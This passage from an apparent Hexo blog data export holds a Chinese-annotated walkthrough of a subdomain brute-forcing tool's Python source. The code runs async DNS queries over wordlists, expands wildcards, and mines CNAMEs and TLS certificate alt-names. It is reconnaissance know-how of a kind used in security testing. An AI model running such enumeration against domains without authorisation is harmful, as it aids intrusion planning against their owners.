class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _))    <span class=\"comment\"># priority set to 0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 含占位符的子域名直接加入队列</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> wildcard_lines[<span class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put(_)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测进程状态</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">update_counter</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count.value += <span class=\"variable language_\">self</span>.scan_count_local</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.queue_size_array[<span class=\"variable language_\">self</span>.process_num] = <span class=\"variable language_\">self</span>.queue.qsize()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.found_count_local:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count.value += <span class=\"variable language_\">self</span>.found_count_local</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">            <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">check_https_alt_names</span>(<span class=\"params\">self, domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 建立异步HTTPS连接</span></span><br><span class=\"line\">            reader, _ = <span class=\"keyword\">await</span> asyncio.open_connection(</span><br><span class=\"line\">                host=domain,</span><br><span class=\"line\">                port=<span class=\"number\">443</span>,</span><br><span class=\"line\">                ssl=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                server_hostname=domain,</span><br><span class=\"line\">            )</span><br><span class=\"line\">            <span class=\"comment\"># 获取证书详细信息</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reader._transport.get_extra_info(<span class=\"string\">&#x27;peercert&#x27;</span>)[<span class=\"string\">&#x27;subjectAltName&#x27;</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> item[<span class=\"number\">0</span>].upper() == <span class=\"string\">&#x27;DNS&#x27;</span>:</span><br><span class=\"line\">                    name = item[<span class=\"number\">1</span>].lower()</span><br><span class=\"line\">                    <span class=\"comment\"># 筛选符合条件的子域名</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> name.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                        sub = name[:<span class=\"built_in\">len</span>(name) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                        sub = sub.replace(<span class=\"string\">&#x27;*&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                        sub = sub.strip(<span class=\"string\">&#x27;.&#x27;</span>)</span><br><span class=\"line\">                        <span class=\"comment\"># 去重并添加到任务队列</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> \\</span><br><span class=\"line\">                                sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.cert_subs:</span><br><span class=\"line\">                            <span class=\"variable language_\">self</span>.cert_subs.add(sub)</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询DNS解析结果，并限制查询的超时时间</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">do_query</span>(<span class=\"params\">self, j, cur_domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.2</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.resolvers[j].resolve(cur_domain, <span class=\"string\">&#x27;A&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 扫描</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">scan</span>(<span class=\"params\">self, j</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 设置DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers[j].nameservers = [<span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.dns_count &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                s = random.choice(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> s != <span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.resolvers[j].nameservers.append(s)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 处理子域</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                brace_count, sub = <span class=\"variable language_\">self</span>.queue.get_nowait()</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">                empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> asyncio.queues.QueueEmpty <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                empty_counter += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> empty_counter &gt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 对于带有通配符的子域进行处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                brace_count -= <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">&#x27;&#123;next_sub&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub.replace(<span class=\"string\">&#x27;&#123;next_sub&#125;&#x27;</span>, _)))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">&#x27;0123456789&#x27;</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                cur_domain = sub + <span class=\"string\">&#x27;.&#x27;</span> + <span class=\"variable language_\">self</span>.domain</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 执行DNS查询</span></span><br><span class=\"line\">                answers = <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, cur_domain)</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 处理DNS查询结果，排除无效IP</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> answers:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_subs.add(sub)</span><br><span class=\"line\">                    ips = <span class=\"string\">&#x27;, &#x27;</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">                    invalid_ip_found = <span class=\"literal\">False</span></span><br><span class=\"line\">                    <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> answer.address <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;1.1.1.1&#x27;</span>, <span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"string\">&#x27;0.0.0.1&#x27;</span>]:</span><br><span class=\"line\">                            invalid_ip_found = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> invalid_ip_found:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.i <span class=\"keyword\">and</span> is_intranet(answers[<span class=\"number\">0</span>].host):</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"comment\"># 查询CNAME记录</span></span><br><span class=\"line\">                        cname = <span class=\"built_in\">str</span>(answers.canonical_name)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> cname != cur_domain <span class=\"keyword\">and</span> cname.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                            cname_sub = cname[:<span class=\"built_in\">len</span>(cname) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, cname_sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    first_level_sub = sub.split(<span class=\"string\">&#x27;.&#x27;</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">                    max_found = <span class=\"number\">20</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.w:</span><br><span class=\"line\">                        first_level_sub = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">                        max_found = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (first_level_sub, ips) <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.ip_dict:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] = <span class=\"number\">1</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] &gt; max_found:</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_count_local += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 将查询结果写入文件</span></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.write(cur_domain.ljust(<span class=\"number\">30</span>) + <span class=\"string\">&#x27;\\t&#x27;</span> + ips + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 检查HTTPS证书</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"variable language_\">self</span>.options.no_cert_check:</span><br><span class=\"line\">                        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.0</span>):</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.check_https_alt_names(cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, <span class=\"string\">&#x27;lijiejie-test-not-existed.&#x27;</span> + cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">except</span> dns.resolver.NXDOMAIN <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.queue.qsize() &lt; <span class=\"number\">20000</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _ + <span class=\"string\">&#x27;.&#x27;</span> + sub))</span><br><span class=\"line\">                        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">1</span>, <span class=\"string\">&#x27;&#123;next_sub&#125;.&#x27;</span> + sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> dns.resolver.NoNameservers <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.no_server_subs[sub] = <span class=\"variable language_\">self</span>.no_server_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.no_server_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.exception.Timeout, dns.resolver.LifetimeTimeout) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.timeout_subs[sub] = <span class=\"variable language_\">self</span>.timeout_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.timeout_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>(<span class=\"built_in\">type</span>(e)).find(<span class=\"string\">&#x27;asyncio.exceptions.TimeoutError&#x27;</span>) &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;errors.log&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>) <span class=\"keyword\">as</span> errFile:</span><br><span class=\"line\">                        errFile.write(<span class=\"string\">&#x27;[%s] %s\\n&#x27;</span> % (<span class=\"built_in\">type</span>(e), <span class=\"built_in\">str</span>(e)))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.load_sub_names()</span><br><span class=\"line\">        tasks = [<span class=\"variable language_\">self</span>.scan(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        tasks.insert(<span class=\"number\">0</span>, <span class=\"variable language_\">self</span>.update_counter())</span><br><span class=\"line\">        <span class=\"keyword\">await</span> asyncio.gather(*tasks)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        loop = asyncio.get_event_loop()</span><br><span class=\"line\">        asyncio.set_event_loop(loop)</span><br><span class=\"line\">        loop.run_until_complete(<span class=\"variable language_\">self</span>.async_run())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_process</span>(<span class=\"params\">*params</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 信号处理器</span></span><br><span class=\"line\">    signal.signal(signal.SIGINT, user_abort)</span><br><span class=\"line\">    <span class=\"comment\"># 调用SubNameBrute的run方法</span></span><br><span class=\"line\">    s = SubNameBrute(*params)</span><br><span class=\"line\">    s.run()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 根据option.process启动多个进程</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> process_num <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(options.process):</span><br><span class=\"line\">    p = multiprocessing.Process(</span><br><span class=\"line\">        <span class=\"comment\"># 调用run_process进行扫描</span></span><br><span class=\"line\">        target=run_process,</span><br><span class=\"line\">        args=(domain, options, process_num, dns_servers, next_subs,</span><br><span class=\"line\">              scan_count, found_count, queue_size_array, tmp_dir)</span><br><span class=\"line\">    )</span><br><span class=\"line\">    all_process.append(p)</span><br><span class=\"line\">    p.start()</span><br></pre></td></tr></table></figure>\n\n<p>总体的工作路径为：</p>\n<ul>\n<li><strong>加载子域名</strong>：从文件中读取子域名，识别通配符，放入任务队列</li>\n<li>扫描子域<ul>\n<li>多线程扫描子域</li>\n<li>对每个子域执行DNS查询，处理返回结果</li>\n<li>对子域名进行证书检查，CNAME解析等附加操作</li>\n</ul>\n</li>\n<li><strong>记录结果</strong></li>\n<li><strong>错误处理与重试</strong>：对于DNS查询失败的子域进行重试，最多三次</li>\n</ul>\n<p>这里有个证书检查和CNAME解析，还有一个称呼叫<strong>证书透明度</strong>主要原因是<strong>提高全面性</strong>。在<strong>SSL&#x2F;TLS</strong>证书中的<code>subjectAltName</code>字段会暴露一些隐藏子域。<strong>CNAME</strong>是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。</p>\n<p><strong>对于通配符子域名的处理</strong>：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。</p>\n"}],"PostAsset":[{"_id":"source/_posts/sql注入/image-20250305014536324.png","post":"cm7ussaxm0001asjfdcap15zx","slug":"image-20250305014536324.png","modified":1,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"cm7ussaxm0001asjfdcap15zx","tag_id":"cm7ussaxr0004asjf11ercpl3","_id":"cm7ussaxt0006asjf568acuw0"},{"post_id":"cm7ussaxp0003asjf6ttp7t5c","tag_id":"cm7ussaxr0004asjf11ercpl3","_id":"cm7ussaxu0007asjf320o7m7f"},{"post_id":"cm7ussay80008asjf00ut25cx","tag_id":"cm7ussaxr0004asjf11ercpl3","_id":"cm7ussay90009asjfh80c8wu3"}],"Tag":[{"name":"网络安全","_id":"cm7ussaxr0004asjf11ercpl3"}]}}